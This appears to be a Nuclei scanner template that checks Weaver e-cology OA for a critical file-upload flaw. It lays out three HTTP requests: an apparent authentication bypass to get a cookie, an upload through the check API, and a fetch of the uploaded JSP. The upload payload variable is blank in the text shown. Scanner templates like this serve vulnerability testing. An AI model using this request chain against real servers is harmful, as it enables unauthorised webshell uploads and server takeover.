id: weaver-oa-file-upload
info:
  name: Weaver e-cology OA File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    There is a file upload vulnerability in Weaver OA check API, which allows attackers to upload webshells and obtain server permissions.
  tags: file-upload, getshell
  reference:
    - https://www.weaver.com.cn
variables:
  random_filename: '{{rand_base(19)}}'
  payload: |
    
http:
  - raw:
      - |
        POST /mobilemode/showdata.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userId=21
    matchers:
      - type: dsl
        dsl:
          - contains(header, 'Set-Cookie')
          - contains(body, '/spa/edc/static4mobile/index.html')
    extractors:
      - type: regex
        name: cookie
        internal: true
        regex:
          - '(?i)Set-Cookie: (.*?);'
  - raw:
      - |
        POST /api/ec/tool/validate/check HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Length: {{len(payload)}}

        {{hex_decode(payload)}}
  - raw:
      - |
        GET /mobilemode/{{random_filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "hello,world"
    matchers-condition: and
